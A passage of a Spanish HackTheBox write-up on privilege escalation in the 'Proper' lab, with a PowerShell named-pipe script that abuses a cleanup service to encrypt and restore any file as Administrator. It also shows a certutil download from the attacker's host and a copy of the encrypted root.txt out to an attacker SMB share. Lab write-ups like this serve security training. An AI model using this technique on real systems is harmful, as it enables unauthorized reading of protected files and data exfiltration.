Jmmm, algo extraño es que le agrega **2 puntos** al final de la búsqueda y ese tiene pinta de ser el problema... 

Después de un rato probando otras formas de jugar con el script, llegamos a una idea más pequeña:

```powershell
c:\Program Files\Cleanup>type writer.ps1
```

```powershell
# Nos conectamos al pipe
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream("cleanupPipe");
$pipe.Connect(); 

# Generamos objeto para interactuar con el pipe
$sw = New-Object System.IO.StreamWriter($pipe);
# Indicamos que borre el archivo que habiamos creado antes como prueba
$sw.Write("CLEAN C:\\Users\Varg\Downloads\aja.txt");

# Cerramos objetos
$sw.Dispose(); 
$pipe.Dispose();
```

Lo ejecutamos y obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_fail.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Aparentemente va todo bien, pero en el servidor:

```powershell
c:\Program Files\Cleanup>server.exe
...
CLEAN C:\\Users\Varg\Downloads\aja.tx
open C:\\Users\Varg\Downloads\aja.tx: The system cannot find the file specified.
```

Ahora le quita una letraaaaaaaaaaaaaaaaaa 🤣, pero bueno, acá es más fácil, simplemente agreguémosle una al final de la cadena a ver si la interpreta bien:

```powershell
...
$sw.Write("CLEAN C:\\Users\Varg\Downloads\aja.txt.");
...
```

Y ahora obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

```powershell
c:\Program Files\Cleanup>server.exe
...
CLEAN C:\\Users\Varg\Downloads\aja.txt
```

Perfecto, al menos no nos reporta errores, validando si el archivo se borró realmente tenemos:

```powershell
PS C:\Program Files\Cleanup> ls C:\\Users\Varg\Downloads\
PS C:\Program Files\Cleanup> 
```

Listones, y también validemos que se haya generado el archivo encriptado en la ruta `C:\ProgramData\Cleanup`:

```powershell
PS C:\Program Files\Cleanup> dir C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM            120 QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==

PS C:\Program Files\Cleanup> type C:\ProgramData\Cleanup\QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==
1d30bfee9a03a2c8e2c9adb66ce895cf5949e2d2406bf0ec66077fc4fe37f6aefd558f64a636570de0db530327936f35e73638155d8f0b56361cb600
```

Si decodeamos el nombre del archivo obtenemos `C:\\Users\Varg\Downloads\aja.txt`, así que perfecto, ahora hagamos el **restore** a ver como se procesa apoyándonos de **IO Ninja**:

```powershell
PS C:\Program Files\Cleanup> .\client.exe -R C:\\Users\Varg\Downloads\aja.txt
Restoring C:\\Users\Varg\Downloads\aja.txt
PS C:\Program Files\Cleanup> ls C:\ProgramData\Cleanup\
PS C:\Program Files\Cleanup> 
```

Oko, parece que sí, validemos el proceso y si lo dejo en su ruta **nativa**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_restorePath_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OHH, el **restore** ya lo hace con la cadena decodeada, interesante (además de que tenemos `CLEANER` y `RESTORE` para usar en dado caso con nuestro script).

```powershell
PS C:\Program Files\Cleanup> ls C:\\Users\Varg\Downloads\

    Directory: C:\\Users\Varg\Downloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM             16 aja.txt

PS C:\Program Files\Cleanup> type C:\\Users\Varg\Downloads\aja.txt
a vel
```

...

## Extraemos cualquier archivo del sistema [📌](#cleanup-readfiles) {#cleanup-readfiles}

Listoooooones, lo hace correctamente, tenemos un script funcional y sabemos como funciona `CLEANER` y `RESTORE`.

Con esto en mente, ya podríamos ver el path para extraer archivos como **Administrator** y aprovecharnos de ellos para ver su contenido, si aún no lo ves, échale un poco de cabeza a ver como lo harías e.e

Listo, ¿ya lo tienes? Entonces... 

Podemos aprovecharnos para extraer por ejemplo el archivo `root.txt` así:

1. Estando en la máquina víctima subimos nuestro script con la línea `$sw.Write("CLEAN C:\\Users\Administrator\Desktop\root.txt.");`.
2. Ejecutamos y veríamos en la ruta `C:\ProgramData\Cleanup\` el archivo encriptado.
3. Lo tomamos y nos lo pasamos a nuestra VM **Windows**.
4. Lo colocamos en la ruta `C:\ProgramData\Cleanup\`.
5. Aprovechamos el uso del `RESTORE`, le pasamos la ruta `C:\\Users\Administrator\Desktop\root.txt`, como hace la restauración en la ruta original, en teoría regeneraría el archivo en el directorio `C:\\Users\Administrator\Desktop\`.

Démosle...

Subimos script y ejecutamos, con esto generamos el `CLEAN` del archivo `root.txt`:

```powershell
PS C:\\Users\web\Videos> .\certutil.exe -f -urlcache -split http://10.10.14.164:8000/writer.ps1 writer.ps1
PS C:\\Users\web\Videos> type .\writer.ps1
```

```powershell
# Nos conectamos al pipe
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream("cleanupPipe");
$pipe.Connect(); 

# Generamos objeto para interactuar con el pipe
$sw = New-Object System.IO.StreamWriter($pipe);
# Indicamos que borre el archivo
$sw.Write("CLEAN C:\\Users\Administrator\Desktop\root.txt");

# Cerramos objetos
$sw.Dispose(); 
$pipe.Dispose();
```

Ejecutamos y obtenemos el archivo:

```powershell
PS C:\\Users\web\Videos> dir C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
```

Nos lo pasamos a nuestra máquina, podemos hacer uso de la carpeta compartida:

```powershell
PS C:\\Users\web\Videos> copy C:\ProgramData\Cleanup\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0 \\10.10.14.164\smbFolder\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
```

Listo, ahora nos lo llevamos a la máquina virtual **Windows** y lo metemos en la ruta `C:\ProgramData\Cleanup\`:

```powershell
PS C:\Program Files\Cleanup> ls C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 AM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
```

Ahora intentamos restaurarlo, peeeeero antes, validamos que la ruta `C:\\Users\Administrator\Desktop` exista (en mi caso no, la creamos rápidamente):

```powershell
PS C:\Program Files\Cleanup> ls -force c:\\Users

    Directory: C:\\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         9/28/2020   1:22 PM                Public
d-----         3/29/2021   7:32 PM                Varg

PS C:\Program Files\Cleanup> mkdir C:\\Users\Administrator
PS C:\Program Files\Cleanup> mkdir C:\\Users\Administrator\Desktop
PS C:\Program Files\Cleanup> ls c:\\Users

    Directory: C:\\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/9/2021  11:43 AM                Administrator
d-r---         9/28/2020   1:22 PM                Public
d-----         3/29/2021   7:32 PM                Varg

PS C:\Program Files\Cleanup> ls C:\\Users\Administrator\

    Directory: C:\\Users\Administrator

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/9/2021  11:43 AM                Desktop
```

Ahora si restauramos:

```powershell
PS C:\Program Files\Cleanup> .\client.exe -R C:\\Users\Administrator\Desktop\root.txt
Restoring C:\\Users\Administrator\Desktop\root.txt
PS C:\Program Files\Cleanup> ls C:\ProgramData\Cleanup\
PS C:\Program Files\Cleanup> ls C:\\Users\Administrator\Desktop\

    Directory: C:\\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  11:44 AM             34 root.txt
```

😮 **:O** :o **o.O** 😲 O.O ohhh...

Y si vemos su contenido:

```powershell
PS C:\Program Files\Cleanup> type C:\\Users\Administrator\Desktop\root.txt
dd355d81...........................74
```

OPAAAAA, pero claro que si!! Tenemos la flag, por lo tanto podemos leer cualquier archivo del sistema como usuario **Administrator** :O Perfectisimo...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_root_flag_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Intentando generar una reverse Shell de alguna manera (no se me ocurre como) nos quedamos un buen rato pensando, pero nada, no lo logramos, si lo sabes me cuentas y lo agregamos al writeup de UNAAAAAAAAAAAA!!

Hemos terminadooooowowowowowow.

...

Linda linda liiiiinda máquina. Me gusto bastante el camino para llegar al usuario **web**, fantástico el `race condition` que explotamos para modificar el contenido del archivo `header.inc` inyectando código `PHP` mientras el servidor lo busca, na na na, muy lindo. 

El pensamiento lateral del **privesc** es increíble.

Muchísimas gracias por leerse otro writeup gigante, pero que espero les sirva tanto como a mí. ¡Y como siempre, a seguir rompiendo!!